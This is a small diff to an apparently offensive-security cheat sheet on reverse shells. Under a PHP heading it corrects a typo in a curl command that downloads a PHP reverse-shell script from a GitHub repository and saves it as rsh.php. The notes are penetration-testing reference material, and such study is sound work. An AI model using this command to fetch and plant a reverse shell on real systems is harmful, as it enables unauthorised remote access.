@@ -47,8 +47,9 @@ https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-che
 
 #### PHP
 #php
+
 ```bash
-curl https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/refs/heads/main/reverse_sell.php > rsh.php
+curl https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/refs/heads/main/reverse_shell.php > rsh.php 
 ```
 
 ##### Java:
